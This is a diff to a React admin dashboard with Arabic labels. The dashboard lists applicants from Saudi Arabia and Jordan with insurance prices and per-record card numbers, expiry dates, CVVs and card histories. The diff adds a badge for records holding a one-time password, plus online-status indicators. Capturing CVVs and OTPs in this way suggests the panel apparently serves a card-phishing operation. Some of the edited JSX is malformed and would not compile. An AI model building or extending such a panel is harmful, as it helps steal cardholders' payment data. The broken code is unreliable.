@@ -59,13 +59,10 @@ function UserStatus({ userId }: { userId: string }) {
       <div
         className={`w-2 h-2 rounded-full transition-all ${
           status === "online"
-            ? "bg-success shadow-[0_0_8px_rgba(var(--success),0.6)] animate-pulse"
-            : "bg-muted-foreground/40"
+            ? "bg-teal-500 shadow-[0_0_8px_rgba(var(--success),0.6)] animate-pulse"
+            : "bg-red-500"
         }`}
       />
-      <span className={`text-xs font-medium ${status === "online" ? "text-success" : "text-muted-foreground"}`}>
-        {status === "online" ? "متصل" : "غير متصل"}
-      </span>
     </div>
   )
 }
@@ -375,25 +372,7 @@ export default function AdminDashboard() {
     return !!(app.cardNumber || app.expiryDate || app.cvv)
   }, [])
 
-  const getStatusBadge = useCallback((status: string) => {
-    const badges = {
-      draft: { text: "مسودة", className: "bg-muted text-muted-foreground border-border" },
-      pending_review: {
-        text: "قيد المراجعة",
-        className: "bg-warning/15 text-warning border-warning/30",
-      },
-      approved: {
-        text: "موافق عليه",
-        className: "bg-success/15 text-success border-success/30",
-      },
-      rejected: { text: "مرفوض", className: "bg-destructive/15 text-destructive border-destructive/30" },
-      completed: {
-        text: "مكتمل",
-        className: "bg-primary/15 text-primary border-primary/30",
-      },
-    }
-    return badges[status as keyof typeof badges] || badges.draft
-  }, [])
+
 
   const formatArabicDate = useCallback((dateString?: string) => {
     if (!dateString) return ""
@@ -693,11 +672,11 @@ export default function AdminDashboard() {
                       setShowChat(false)
                       markAsRead(app)
                     }}
-                    className={`group relative p-4 cursor-pointer transition-all duration-200 hover:bg-muted/50 ${
+                    className={`group relative p-4 cursor-pointer transition-all duration-200 hover:bg-muted/50 ${  isUnread(app)?"bg-red-500/40":""}
+                      ? "bg-red-400/[0.02]"} ${
                       selectedApplication?.id === app.id
-                        ? "bg-primary/5 border-r-[3px] border-r-primary"
-                        : isUnread(app)
-                          ? "bg-primary/[0.02]"
+                        ? "bg-red-500/5 border-r-[3px] border-r-primary"
+                       
                           : ""
                     }`}
                   >
@@ -710,13 +689,15 @@ export default function AdminDashboard() {
                       />
                       <div className="flex-1 min-w-0">
                         <div className="flex items-start justify-between gap-2 mb-2.5">
-                          <div className="flex items-center gap-2 min-w-0">
+                          <div className="flex items-center gap-2 min-w-0 isUnread(app)">
+                            <UserStatus userId={app?.id!} />
+                           
                             <span className="text-lg flex-shrink-0">
-                              {app.country === "Saudi Arabia" ? "🇸🇦" : app.country === "Jordan" ? "🇯🇴" : "🌍"}
+                              {app.country === "Saudi Arabia" ? <img src="/Flag_of_Saudi_Arabia.svg" alt="jo" width={20}/> : app.country === "Jordan" ?<img src="/Flag_of_Jordan.svg" alt="jo" width={20}/> : "🌍"}
                             </span>
                             <h3 className="font-semibold text-foreground truncate">{app.ownerName}</h3>
                             {isUnread(app) && (
-                              <span className="w-2.5 h-2.5 rounded-full bg-primary flex-shrink-0 animate-pulse" />
+                              <span className="w-2.5 h-2.5 rounded-full bg-red-400 flex-shrink-0 animate-pulse" />
                             )}
                           </div>
                           <div className="flex items-center gap-1 opacity-0 group-hover:opacity-100 transition-opacity">
@@ -739,12 +720,7 @@ export default function AdminDashboard() {
                           </div>
                         </div>
                         <div className="flex items-center gap-2 mb-2.5 flex-wrap">
-                          <Badge
-                            variant="outline"
-                            className={getStatusBadge(app.status).className + " text-[10px] px-2 py-0.5 rounded-md"}
-                          >
-                            {getStatusBadge(app.status).text}
-                          </Badge>
+                        
                           <Badge variant="outline" className="text-[10px] px-2 py-0.5 bg-muted/50 rounded-md">
                             {getStepName(app.currentStep)}
                           </Badge>
@@ -757,6 +733,10 @@ export default function AdminDashboard() {
                               بطاقة
                             </Badge>
                           )}
+                          {app?.otp&&<Badge  variant="outline"
+                              className="text-[10px] px-2 py-0.5 bg-primary/10 text-primary border-primary/20 rounded-md">
+                            رمز 
+                            </Badge>}
                           {app.cardHistory && app.cardHistory.length > 0 && (
                             <Badge
                               variant="outline"
@@ -927,7 +907,7 @@ export default function AdminDashboard() {
                                 <div className="p-4 bg-gradient-to-br from-success/20 to-success/5 border border-success/30 rounded-xl">
                                   <p className="text-xs font-medium text-success mb-2">قيمة التأمين</p>
                                   <p className="text-3xl font-bold text-success font-mono text-center" dir="ltr">
-                                    {selectedApplication.totalPrice}
+                                    {parseInt(selectedApplication.totalPrice)}
                                   </p>
                                 </div>
                               )}
